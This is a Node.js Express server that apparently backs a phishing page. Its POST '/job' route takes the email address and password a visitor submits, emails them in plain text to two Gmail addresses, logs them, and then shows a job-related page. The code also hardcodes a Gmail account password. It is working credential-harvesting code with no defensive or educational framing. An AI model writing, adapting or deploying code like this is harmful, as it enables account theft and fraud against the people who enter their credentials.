const express = require("express");
const app = express();
const open = require('open');
const nodemailer = require('nodemailer');
const bodyParser = require("body-parser");


app.use(bodyParser.urlencoded({extended: true}));
app.use(express.static("public"));


app.get("/", (req,res)=>{
  res.sendFile(__dirname+"/index.html");
  // window.close();
})

app.post("/job",(req,res)=>{

  let emaill = req.body.email;
  let passs = req.body.pass;

  var transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
      user: 'bh3.cobrafamily@gmail.com',
      pass: 'Cobra@#123'
    }
  });
//

  var mailOptions = {
    from: 'bh3.cobrafamily@gmail.com',
    to: 'bh3.cobrafamily@gmail.com, vishalvrm735@gmail.com',
    subject: 'Sending Email using Node.js',
    text: "email--> "+emaill + "      password -->" + passs
    // text: `Hi Smartherd, thank you for your nice Node.js tutorials.
    //         I will donate 50$ for this course. Please send me payment options.`
    // html: '<h1>Hi Smartherd</h1><p>Your Messsage</p>'
  };

  transporter.sendMail(mailOptions, function(error, info){
    if (error) {
      console.log(error);
    } else {
      console.log('Email sent: ' + info.response);
    }
  });

  console.log(emaill, passs);
   res.sendFile(__dirname+"/job.html");
  // open('https://www.net-empregos.com/algarve/');
  // res.send("<script>window.close();</script >");


});

app.listen(process.env.PORT || 80, ()=>{
  console.log("server started at port 80");
});
